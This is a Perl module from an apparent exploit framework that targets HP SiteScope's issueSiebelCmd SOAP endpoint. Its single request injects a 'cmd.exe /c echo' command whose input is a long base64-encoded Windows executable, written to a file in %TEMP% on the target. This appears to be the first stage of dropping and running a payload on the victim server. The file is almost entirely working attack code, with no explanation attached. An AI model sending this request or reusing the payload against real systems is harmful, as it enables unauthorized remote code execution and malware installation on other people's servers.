package MSFPerlExploits::HP::MSF::SitescopeIssuesiebelcmd;
use parent qw(P1rK3r::Exploit P1rK3r::Services::HP);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "SitescopeIssuesiebelcmd";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'SitescopeIssuesiebelcmd',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'services/APISiteScopeImpl',
                        PAYLOAD      => '<soapenv:Envelope xmlns:api='http://Api.freshtech.COM' xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><soapenv:Header/><soapenv:Body><api:issueSiebelCmd soapenv:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'><in0 xsi:type='xsd:string'>cmd.exe /c echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACTOPDW11mehddZnoXXWZ6FrEWShdNZnoVURZCF3lmehbhGlIXcWZ6FuEaahdRZnoXXWZ+FHlmehVRRw4XfWZ6Fg3quhf9ZnoUQX5iF1lmehVJpY2jXWZ6FAAAAAAAAAAAAAAAAAAAAAFBFAABMAQQAhH+1SgAAAAAAAAAA4AAPAQsBBgAAsAAAAKAAAAAAAADTWQAAABAAAADAAAAAAEAAABAAAAAQAAAEAAAAAAAAAAQAAAAAAAAAAGABAAAQAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAbMcAAHgAAAAAUAEAyAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAODBAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAADgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABmqQAAABAAAACwAAAAEAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA5g8AAADAAAAAEAAAAMAAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAFxwAAAA0AAAAEAAAADQAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAADIBwAAAFABAAAQAAAAEAEAAAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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>>%TEMP%\eaipC.b64 &#x26; /u RWhJ /p Zces</in0></api:issueSiebelCmd></soapenv:Body></soapenv:Envelope>',
                        TEXT         => 'Sending First Exploit Request On : /services/APISiteScopeImpl',
                        HEADERS      => {
                           'SOAPAction' => '""',
                           'Content-Type' => 'text/xml; charset=UTF-8',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;